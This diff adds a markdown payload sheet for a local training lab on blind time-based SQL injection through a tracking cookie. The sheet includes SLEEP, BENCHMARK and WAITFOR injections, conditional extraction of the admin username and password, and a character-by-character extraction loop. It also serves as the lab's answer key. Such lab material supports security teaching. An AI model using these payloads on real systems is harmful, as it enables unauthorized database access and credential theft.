@@ -1,0 +1,135 @@
+# Lab 5: Blind SQL Injection with Time Delays - Test Payloads
+
+## Cookie Modification Methods
+
+1. Browser Developer Tools:
+   - F12 → Application/Storage → Cookies
+   - Edit TrackingId cookie value
+   - Refresh page
+
+2. Burp Suite:
+   - Intercept request
+   - Modify TrackingId cookie in request
+   - Forward request
+
+3. curl command:
+   curl -H "Cookie: TrackingId=PAYLOAD" http://localhost/lab5/index.php
+
+## Basic Time Delay Tests
+
+1. Confirm injection exists:
+   TrackingId=x'
+   (Should work normally or show slight delay)
+
+2. Test 5-second delay:
+   TrackingId=x'||SLEEP(5)--
+
+3. Test 10-second delay (MAIN TARGET):
+   TrackingId=x'||SLEEP(10)--
+
+4. Alternative syntax:
+   TrackingId=x'+AND+SLEEP(10)--
+   TrackingId=x'||(SELECT SLEEP(10))--
+
+## Advanced Time Delay Payloads
+
+5. Using BENCHMARK (CPU-intensive delay):
+   TrackingId=x'+OR+BENCHMARK(10000000,MD5(1))--
+
+6. Multiple delay techniques:
+   TrackingId=x'||SLEEP(10)||SLEEP(5)--
+
+## Conditional Time Delays (Information Extraction)
+
+7. Test if users table exists:
+   TrackingId=x'||IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+
+8. Test if admin user exists:
+   TrackingId=x'||IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(5),0)--
+
+9. Test database version:
+   TrackingId=x'||IF((SELECT @@version LIKE '5%'),SLEEP(5),0)--
+
+## Character Extraction Examples
+
+10. Extract first character of admin username:
+    TrackingId=x'||IF((SELECT SUBSTRING(username,1,1) FROM users WHERE role='admin' LIMIT 1)='a',SLEEP(5),0)--
+
+11. Extract admin password length:
+    TrackingId=x'||IF((SELECT LENGTH(password) FROM users WHERE role='admin' LIMIT 1)>10,SLEEP(5),0)--
+
+## Boolean-Based Variations
+
+12. True condition (should delay):
+    TrackingId=x'||IF(1=1,SLEEP(5),0)--
+
+13. False condition (should not delay):
+    TrackingId=x'||IF(1=2,SLEEP(5),0)--
+
+## Error-Based Attempts (may or may not work)
+
+14. Force error with time delay:
+    TrackingId=x'+AND+(SELECT*FROM(SELECT SLEEP(10))a)--
+
+15. Union-based with delay:
+    TrackingId=x'+UNION+SELECT+SLEEP(10)--
+
+## Database-Specific Payloads
+
+16. MySQL specific:
+    TrackingId=x'||SLEEP(10)--
+    TrackingId=x'+AND+BENCHMARK(50000000,ENCODE('MSG','by 5 seconds'))--
+
+17. PostgreSQL (if applicable):
+    TrackingId=x'||pg_sleep(10)--
+
+18. SQL Server (if applicable):
+    TrackingId=x'+WAITFOR+DELAY+'00:00:10'--
+
+## URL Encoding Variations
+
+19. URL encoded payload:
+    TrackingId=x%27%7C%7CSLEEP(10)--
+
+20. Double encoded:
+    TrackingId=x%2527%257C%257CSLEEP(10)--
+
+## Expected Results
+
+When payload #3 works correctly:
+- Page load time should increase to approximately 10 seconds
+- Success alert should appear on the page
+- Response time counter at bottom should show the delay
+- Lab should be marked as solved
+
+## Success Criteria
+
+✓ Page takes approximately 10 seconds to load
+✓ Success message appears on the page
+✓ Response time counter shows ~10 second delay
+✓ No database errors visible to user (confirming "blind" nature)
+
+## Troubleshooting
+
+- If no delay occurs: Check cookie value was actually modified
+- If page errors: The injection may have syntax issues
+- If delay is wrong: Adjust SLEEP() parameter
+- If nothing works: Verify database is MySQL and supports SLEEP()
+
+## Advanced Techniques
+
+21. Time-based data extraction automation:
+    Script that iterates through characters:
+    for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
+        TrackingId=x'||IF((SELECT SUBSTRING(password,1,1) FROM users WHERE role='admin')='{char}',SLEEP(5),0)--
+
+22. Binary search optimization:
+    TrackingId=x'||IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE role='admin')>65,SLEEP(5),0)--
+
+## Notes
+
+- All payloads assume MySQL database
+- Timing may vary based on server performance
+- Use network timing tools for precise measurements
+- Success is determined by response time, not visible output
+- This is blind injection - no data is directly displayed
